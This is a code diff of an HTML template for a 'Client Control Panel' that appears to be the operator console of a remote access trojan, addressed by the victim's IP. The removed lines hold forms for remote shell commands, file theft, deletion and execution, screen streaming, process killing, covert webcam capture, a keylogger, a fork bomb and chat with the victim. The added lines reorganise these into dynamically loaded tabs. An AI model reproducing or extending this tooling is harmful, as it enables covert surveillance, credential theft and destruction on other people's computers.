@@ -5,700 +5,87 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>Client Control Panel</title>
         <script src="https://cdn.tailwindcss.com"></script>
-        <script
-            src="https://unpkg.com/htmx.org@1.9.10"
-            integrity="sha384-D1Kt99CQMDuVetoL1lrYwg5t+9QdHe7NLX/SoJYkXDFfX37iInKRy5xLSi8nO7UC"
-            crossorigin="anonymous"
-        ></script>
+        <script src="https://unpkg.com/htmx.org@1.9.10"></script>
         <style>
-            /* Basic styles for HTMX loading indicator */
-            .htmx-indicator {
-                opacity: 0;
-                transition: opacity 200ms ease-in;
-            }
-            .htmx-request .htmx-indicator {
-                opacity: 1;
+            .tab-button.active {
+                border-color: #0a84ff;
+                background-color: rgb(24, 24, 24);
+                color: #ffffff;
             }
         </style>
     </head>
-    <body class="bg-gray-900 text-white p-8 font-sans">
-        <div class="bg-gray-800 p-6 rounded-lg shadow-xl max-w-6xl mx-auto">
-            <h2 class="text-2xl mb-6 font-semibold">
+    <body class="bg-[rgb(24,24,24)] text-white p-8 font-['SF Pro Text']">
+        <div
+            class="bg-[rgb(32,32,32)] p-6 rounded-2xl shadow-lg max-w-6xl mx-auto"
+        >
+            <h2 class="text-2xl mb-6 font-medium">
                 Controlling Client:
-                <span class="text-blue-400 font-mono">{{ ip }}</span>
+                <span class="text-[#0A84FF] font-['SF Mono']">{{ ip }}</span>
             </h2>
 
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div
-                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
+            <div
+                id="tab-buttons"
+                class="flex flex-wrap space-x-2 border-b border-[rgb(44,44,44)] mb-6"
+            >
+                {% for component in components %}
+                <button
+                    hx-get="/components/{{ component }}/{{ ip }}"
+                    hx-target="#tab-content"
+                    class="tab-button px-4 py-2 border-b-2 border-transparent hover:bg-[rgb(44,44,44)] transition capitalize"
                 >
-                    <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                        Remote Shell (RSH)
-                    </h3>
-                    <form
-                        hx-post="/api/command/{{ ip }}"
-                        hx-target="#command-output-{{ ip }}"
-                    >
-                        <input type="hidden" name="module" value="RSH" />
-                        <div class="flex flex-col md:flex-row gap-2">
-                            <input
-                                type="text"
-                                name="args.command"
-                                placeholder="Enter a command, e.g., whoami"
-                                class="flex-grow p-3 bg-gray-800 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
-                            />
-                            <select
-                                name="args.shell"
-                                class="p-3 bg-gray-800 rounded border border-gray-600 focus:outline-none focus:border-blue-500 transition"
-                            >
-                                <option value="default">default</option>
-                                <option value="cmd">CMD</option>
-                                <option value="powershell">PowerShell</option>
-                                <option value="bash">Bash</option>
-                                <option value="sh">SH</option>
-                            </select>
-                            <button
-                                type="submit"
-                                class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition"
-                            >
-                                Execute
-                            </button>
-                        </div>
-                    </form>
-                </div>
-
-                <div class="col-span-1 bg-gray-900 p-4 rounded-lg">
-                    <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                        File System (FS)
-                    </h3>
-                    <div class="space-y-3">
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input type="hidden" name="module" value="FS" />
-                            <input
-                                type="hidden"
-                                name="args.operation"
-                                value="GET"
-                            />
-                            <input
-                                type="text"
-                                name="args.path"
-                                placeholder="Path, e.g., C:\"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
-                            >
-                                Get Content / List
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input type="hidden" name="module" value="FS" />
-                            <input
-                                type="hidden"
-                                name="args.operation"
-                                value="MOV"
-                            />
-                            <input
-                                type="text"
-                                name="args.path"
-                                placeholder="Source path"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <input
-                                type="text"
-                                name="args.to"
-                                placeholder="Destination path"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
-                            >
-                                Move / Rename
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                            class="grid grid-cols-2 gap-2"
-                        >
-                            <input type="hidden" name="module" value="FS" />
-                            <input
-                                type="text"
-                                name="args.path"
-                                placeholder="Target Path for Ops Below"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 col-span-2"
-                            />
-                            <button
-                                type="submit"
-                                hx-vals='{"args.operation": "DOWN"}'
-                                class="bg-sky-600 hover:bg-sky-700 p-2 rounded transition"
-                            >
-                                Download
-                            </button>
-                            <button
-                                type="submit"
-                                hx-vals='{"args.operation": "DEL"}'
-                                class="bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                            >
-                                Delete
-                            </button>
-                            <button
-                                type="submit"
-                                hx-vals='{"args.operation": "RUN"}'
-                                class="bg-green-600 hover:bg-green-700 p-2 rounded transition col-span-2"
-                            >
-                                Run
-                            </button>
-                        </form>
-                    </div>
-                </div>
-
-                <div class="col-span-1 bg-gray-900 p-4 rounded-lg space-y-4">
-                    <div>
-                        <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                            Remote Screen (RS)
-                        </h3>
-                        <div class="grid grid-cols-2 gap-2">
-                            <form
-                                hx-post="/api/command/{{ ip }}"
-                                hx-target="#command-output-{{ ip }}"
-                                class="col-span-2"
-                            >
-                                <input
-                                    type="hidden"
-                                    name="module"
-                                    value="RS"
-                                /><input
-                                    type="hidden"
-                                    name="args.action"
-                                    value="screenshot"
-                                />
-                                <button
-                                    type="submit"
-                                    class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
-                                >
-                                    Take Screenshot
-                                </button>
-                            </form>
-                            <form
-                                hx-post="/api/command/{{ ip }}"
-                                hx-target="#command-output-{{ ip }}"
-                            >
-                                <input
-                                    type="hidden"
-                                    name="module"
-                                    value="RS"
-                                /><input
-                                    type="hidden"
-                                    name="args.action"
-                                    value="stream_start"
-                                />
-                                <input
-                                    type="number"
-                                    name="args.fps"
-                                    value="15"
-                                    class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2 text-center"
-                                />
-                                <button
-                                    type="submit"
-                                    class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
-                                >
-                                    Start Stream
-                                </button>
-                            </form>
-                            <form
-                                hx-post="/api/command/{{ ip }}"
-                                hx-target="#command-output-{{ ip }}"
-                            >
-                                <input
-                                    type="hidden"
-                                    name="module"
-                                    value="RS"
-                                /><input
-                                    type="hidden"
-                                    name="args.action"
-                                    value="stream_stop"
-                                />
-                                <button
-                                    type="submit"
-                                    class="w-full h-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                                >
-                                    Stop Stream
-                                </button>
-                            </form>
-                        </div>
-                    </div>
-                    <div>
-                        <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                            Task Manager (TM)
-                        </h3>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TM"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="list"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition mb-2"
-                            >
-                                List Processes
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                            class="flex gap-2"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TM"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="kill"
-                            />
-                            <input
-                                type="number"
-                                name="args.pid"
-                                placeholder="Process PID"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600"
-                            />
-                            <button
-                                type="submit"
-                                class="bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                            >
-                                Kill
-                            </button>
-                        </form>
-                    </div>
-                </div>
-
-                <!-- ... (все до модуля Webcam без изменений) ... -->
-
-                <!-- 4. Webcam (WC) Module -->
-                <div
-                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
-                >
-                    <h3 class="text-xl font-bold mb-3 text-teal-400">
-                        Webcam (WC)
-                    </h3>
-
-                    <!-- ВМЕСТО <img> ТЕПЕРЬ <canvas> -->
-                    <div
-                        class.="bg-black rounded-lg mb-4 p-2 flex justify-center items-center min-h-[240px]"
-                    >
-                        <canvas
-                            id="webcam-canvas-{{ ip }}"
-                            width="640"
-                            height="480"
-                            class="max-w-full max-h-full rounded bg-gray-700"
-                        ></canvas>
-                    </div>
-
-                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-2">
-                        <!-- Кнопка "Take Photo" теперь тоже будет рисовать на canvas -->
-                        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
-                            <input type="hidden" name="module" value="WC" />
-                            <input
-                                type="hidden"
-                                name="args.mode"
-                                value="photo"
-                            />
-                            <input
-                                type="hidden"
-                                name="args.compressing"
-                                value="true"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-indigo-600 hover:bg-indigo-700 p-2 rounded transition"
-                            >
-                                Take Photo
-                            </button>
-                        </form>
-
-                        <!-- Кнопки Start/Stop просто отправляют команды -->
-                        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
-                            <input type="hidden" name="module" value="WC" />
-                            <input
-                                type="hidden"
-                                name="args.mode"
-                                value="video_start"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
-                            >
-                                Start Video
-                            </button>
-                        </form>
-
-                        <form hx-post="/api/command/{{ ip }}" hx-swap="none">
-                            <input type="hidden" name="module" value="WC" />
-                            <input
-                                type="hidden"
-                                name="args.mode"
-                                value="video_stop"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                            >
-                                Stop Video
-                            </button>
-                        </form>
-                    </div>
-                </div>
-
-                <!-- JAVASCRIPT ДЛЯ ОТРИСОВКИ ВИДЕО -->
-                <script>
-                    (function () {
-                        const canvas = document.getElementById(
-                            "webcam-canvas-{{ ip }}",
-                        );
-                        const ctx = canvas.getContext("2d");
-                        const clientId = "{{ ip }}";
-
-                        // Получаем протокол (ws:// или wss://)
-                        const wsProtocol =
-                            window.location.protocol === "https:"
-                                ? "wss:"
-                                : "ws:";
-                        const wsUrl = `${wsProtocol}//${window.location.host}/ws/feed/${clientId}`;
-
-                        let ws = new WebSocket(wsUrl);
-
-                        ws.onopen = () =>
-                            console.log(
-                                `Connected to webcam feed for ${clientId}`,
-                            );
-                        ws.onerror = (err) =>
-                            console.error("WebSocket Error:", err);
-                        ws.onclose = () =>
-                            console.log(
-                                `Disconnected from webcam feed for ${clientId}`,
-                            );
-
-                        // ГЛАВНОЕ: обработка входящих бинарных кадров
-                        ws.onmessage = async (event) => {
-                            if (event.data instanceof Blob) {
-                                try {
-                                    // Создаем изображение из Blob
-                                    const image = await createImageBitmap(
-                                        event.data,
-                                    );
-                                    // Отрисовываем его на canvas
-                                    canvas.width = image.width;
-                                    canvas.height = image.height;
-                                    ctx.drawImage(image, 0, 0);
-                                    image.close(); // Освобождаем память
-                                } catch (e) {
-                                    console.error("Error drawing image:", e);
-                                }
-                            }
-                        };
-
-                        // Переподключение при обрыве
-                        setInterval(() => {
-                            if (ws.readyState === WebSocket.CLOSED) {
-                                console.log("Reconnecting to webcam feed...");
-                                ws = new WebSocket(wsUrl);
-                            }
-                        }, 5000);
-                    })();
-                </script>
-
-                <div
-                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
-                >
-                    <h3 class="text-xl font-bold mb-3 text-red-400">
-                        Trolling (TRL)
-                    </h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TRL"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="message_box"
-                            />
-                            <input
-                                type="text"
-                                name="args.title"
-                                placeholder="Message Title"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <textarea
-                                name="args.text"
-                                placeholder="Message Text"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                                rows="2"
-                            ></textarea>
-                            <button
-                                type="submit"
-                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
-                            >
-                                Show Message
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TRL"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="open_link"
-                            />
-                            <input
-                                type="url"
-                                name="args.url"
-                                placeholder="https://example.com"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
-                            >
-                                Open Link
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TRL"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="set_clipboard"
-                            />
-                            <input
-                                type="text"
-                                name="args.text"
-                                placeholder="Clipboard Text"
-                                class="w-full p-2 bg-gray-800 rounded border border-gray-600 mb-2"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-yellow-600 hover:bg-yellow-700 p-2 rounded transition"
-                            >
-                                Set Clipboard
-                            </button>
-                        </form>
-                        <form
-                            hx-post="/api/command/{{ ip }}"
-                            hx-target="#command-output-{{ ip }}"
-                        >
-                            <input
-                                type="hidden"
-                                name="module"
-                                value="TRL"
-                            /><input
-                                type="hidden"
-                                name="args.action"
-                                value="fork_bomb"
-                            />
-                            <button
-                                type="submit"
-                                class="w-full bg-red-800 hover:bg-red-900 text-white p-2 rounded transition font-bold"
-                            >
-                                !!! FORK BOMB !!!
-                            </button>
-                        </form>
-                    </div>
-                </div>
-
-                <div
-                    class="col-span-1 md:col-span-2 bg-gray-900 p-4 rounded-lg"
-                >
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        <div>
-                            <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                                Keylogger (KL)
-                            </h3>
-                            <div class="grid grid-cols-3 gap-2">
-                                <form
-                                    hx-post="/api/command/{{ ip }}"
-                                    hx-target="#command-output-{{ ip }}"
-                                >
-                                    <input
-                                        type="hidden"
-                                        name="module"
-                                        value="KL"
-                                    /><input
-                                        type="hidden"
-                                        name="args.action"
-                                        value="start"
-                                    />
-                                    <button
-                                        type="submit"
-                                        class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
-                                    >
-                                        Start
-                                    </button>
-                                </form>
-                                <form
-                                    hx-post="/api/command/{{ ip }}"
-                                    hx-target="#command-output-{{ ip }}"
-                                >
-                                    <input
-                                        type="hidden"
-                                        name="module"
-                                        value="KL"
-                                    /><input
-                                        type="hidden"
-                                        name="args.action"
-                                        value="dump"
-                                    />
-                                    <button
-                                        type="submit"
-                                        class="w-full bg-blue-600 hover:bg-blue-700 p-2 rounded transition"
-                                    >
-                                        Dump
-                                    </button>
-                                </form>
-                                <form
-                                    hx-post="/api/command/{{ ip }}"
-                                    hx-target="#command-output-{{ ip }}"
-                                >
-                                    <input
-                                        type="hidden"
-                                        name="module"
-                                        value="KL"
-                                    /><input
-                                        type="hidden"
-                                        name="args.action"
-                                        value="stop"
-                                    />
-                                    <button
-                                        type="submit"
-                                        class="w-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                                    >
-                                        Stop
-                                    </button>
-                                </form>
-                            </div>
-                        </div>
-                        <div>
-                            <h3 class="text-xl font-bold mb-3 text-indigo-400">
-                                Chat (CH)
-                            </h3>
-                            <form
-                                hx-post="/api/command/{{ ip }}"
-                                hx-target="#command-output-{{ ip }}"
-                                class="flex gap-2 mb-2"
-                            >
-                                <input
-                                    type="hidden"
-                                    name="module"
-                                    value="CH"
-                                /><input
-                                    type="hidden"
-                                    name="args.action"
-                                    value="send"
-                                />
-                                <input
-                                    type="text"
-                                    name="args.message"
-                                    placeholder="Your message..."
-                                    class="w-full p-2 bg-gray-800 rounded border border-gray-600"
-                                />
-                                <button
-                                    type="submit"
-                                    class="bg-blue-600 hover:bg-blue-700 p-2 rounded transition"
-                                >
-                                    Send
-                                </button>
-                            </form>
-                            <div class="grid grid-cols-2 gap-2">
-                                <form
-                                    hx-post="/api/command/{{ ip }}"
-                                    hx-target="#command-output-{{ ip }}"
-                                >
-                                    <input
-                                        type="hidden"
-                                        name="module"
-                                        value="CH"
-                                    /><input
-                                        type="hidden"
-                                        name="args.action"
-                                        value="start"
-                                    />
-                                    <button
-                                        type="submit"
-                                        class="w-full bg-green-600 hover:bg-green-700 p-2 rounded transition"
-                                    >
-                                        Start Chat
-                                    </button>
-                                </form>
-                                <form
-                                    hx-post="/api/command/{{ ip }}"
-                                    hx-target="#command-output-{{ ip }}"
-                                >
-                                    <input
-                                        type="hidden"
-                                        name="module"
-                                        value="CH"
-                                    /><input
-                                        type="hidden"
-                                        name="args.action"
-                                        value="stop"
-                                    />
-                                    <button
-                                        type="submit"
-                                        class="w-full bg-red-600 hover:bg-red-700 p-2 rounded transition"
-                                    >
-                                        Stop Chat
-                                    </button>
-                                </form>
-                            </div>
-                        </div>
-                    </div>
-                </div>
+                    {{ component.replace('_', ' ') }}
+                </button>
+                {% endfor %}
             </div>
 
+            {% if components %}
+            <div
+                id="tab-content"
+                hx-trigger="load"
+                hx-get="/components/{{ components[0] }}/{{ ip }}"
+                hx-swap="innerHTML"
+            >
+                <p class="text-[rgb(128,128,128)] text-center">
+                    Loading {{ components[0] }}...
+                </p>
+            </div>
+            {% else %}
+            <div id="tab-content">
+                <p class="text-[#FFD60A] text-center">
+                    No control components found.
+                </p>
+            </div>
+            {% endif %}
+
             <div class="mt-6">
-                <h3 class="text-xl font-bold mb-3 text-gray-400">Output</h3>
+                <h3 class="text-xl font-medium mb-3 text-[rgb(178,178,178)]">
+                    Output
+                </h3>
                 <div
                     id="command-output-{{ ip }}"
-                    class="mt-4 text-sm bg-black p-4 rounded-lg font-mono whitespace-pre-wrap min-h-[100px]"
+                    class="mt-4 text-sm bg-[rgb(16,16,16)] p-4 rounded-xl font-['SF Mono'] whitespace-pre-wrap min-h-[100px]"
                 >
-                    <p class="text-gray-500">
+                    <p class="text-[rgb(128,128,128)]">
                         Command output will appear here...
                     </p>
                 </div>
             </div>
         </div>
+
+        <script>
+            document.addEventListener("htmx:afterRequest", function (evt) {
+                if (evt.target.id === "tab-content") {
+                    const requestedUrl = evt.detail.requestConfig.path;
+                    document
+                        .querySelectorAll("#tab-buttons .tab-button")
+                        .forEach((button) => {
+                            button.classList.toggle(
+                                "active",
+                                button.getAttribute("hx-get") === requestedUrl,
+                            );
+                        });
+                }
+            });
+        </script>
     </body>
 </html>
